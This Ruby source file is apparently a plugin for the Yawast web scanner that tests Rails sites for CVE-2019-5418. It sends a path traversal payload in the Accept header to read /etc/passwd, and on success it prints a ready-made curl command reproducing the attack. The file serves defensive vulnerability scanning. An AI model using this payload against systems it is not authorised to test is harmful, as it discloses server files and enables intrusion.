# frozen_string_literal: true

module Yawast
  module Scanner
    module Plugins
      module Applications
        module Framework
          class Rails < Yawast::Scanner::Base
            def self.check_all(uri, links)
              check_cve_2019_5418 links
            end

            def self.check_cve_2019_5418(links)
              Yawast::Shared::Output.log_hash 'vulnerabilities',
                                              'rails_cve_2019_5418',
                                              {vulnerable: false, body: nil}

              links.each do |link|
                # this only applies to controllers, so skip the check unless the link ends with '/'
                next unless link.to_s.end_with? '/'

                body = Yawast::Shared::Http.get(URI.parse(link), {'Accept' => '../../../../../../../../../etc/passwd{{'})
                if body.include? 'root:'
                  Yawast::Utilities.puts_vuln 'Rails CVE-2019-5418: File Content Disclosure'
                  Yawast::Utilities.puts_raw "\tcurl -H 'Accept: ../../../../../../../../../etc/passwd{{' #{link}"

                  Yawast::Shared::Output.log_hash 'vulnerabilities',
                                                  'rails_cve_2019_5418',
                                                  {vulnerable: true, body: body, uri: link}
                  break
                end
              end
            end
          end
        end
      end
    end
  end
end
